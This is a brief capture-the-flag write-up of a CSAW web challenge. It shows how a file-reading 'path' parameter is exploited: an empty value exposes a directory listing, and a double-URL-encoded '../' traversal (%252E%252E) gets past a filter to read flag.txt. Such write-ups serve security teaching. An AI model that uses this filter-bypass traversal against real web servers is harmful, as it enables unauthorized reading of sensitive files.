Start this challenge with ``http://web.chal.csaw.io:7311/?path=orange.txt``, we can get ``i love oranges``, if we pass an empty parameter to it, we will get file list.


```
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /poems/</title>
<body>
<h2>Directory listing for /poems/</h2>
<hr>
<ul>
<li><a href="burger.txt">burger.txt</a>
<li><a href="haiku.txt">haiku.txt</a>
<li><a href="orange.txt">orange.txt</a>
<li><a href="ppp.txt">ppp.txt</a>
<li><a href="the_red_wheelbarrow.txt">the_red_wheelbarrow.txt</a>
</ul>
<hr>
</body>
</html>
```

Seems flag is not here, but now we know this challenge might be a LFI.
Test with ``http://web.chal.csaw.io:7311/?path=..``, site return ``WHOA THATS BANNED!!!!``, seems there has a WAF, but use url double quote can bypass it.

Access ``http://web.chal.csaw.io:7311/?path=%252E%252E/flag.txt`` and we will get flag.